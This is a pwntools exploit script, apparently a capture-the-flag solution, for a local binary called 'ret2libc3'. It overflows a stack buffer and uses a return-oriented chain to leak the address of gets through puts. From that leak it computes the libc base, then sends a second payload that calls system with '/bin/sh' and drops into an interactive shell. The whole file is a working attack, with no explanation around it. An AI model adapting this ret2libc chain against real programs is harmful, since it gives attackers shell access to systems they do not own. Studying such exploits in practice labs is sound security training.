#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

def pr(a,addr):
	log.success(a+': '+hex(addr))

p = process('./ret2libc3')
libc = ELF('./libc-2.27.so')
elf = ELF('./ret2libc3')

gets_got = elf.got['gets']
puts_plt = elf.plt['puts']
main = elf.symbols['main']
prdi_ret = 0x400853

payload  = 'A'*0x70 + p64(0)
payload += p64(prdi_ret) + p64(gets_got) + p64(puts_plt)
payload += p64(main) #重新执行

#gdb.attach(p)
#pause()
p.recvuntil("Please pwn me :)\n")
p.sendline(payload)

gets_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = gets_addr - libc.symbols['gets']
do_system = libcbase + 0x4f43b # <system+27>    call   do_system
binsh_addr = libcbase + 0x1b3d88
pr('libcbase',libcbase)

payload  = 'A'*0x70 + p64(0)
payload += p64(prdi_ret) + p64(binsh_addr) + p64(do_system)

p.recvuntil("Please pwn me :)\n")
p.sendline(payload)
p.interactive()
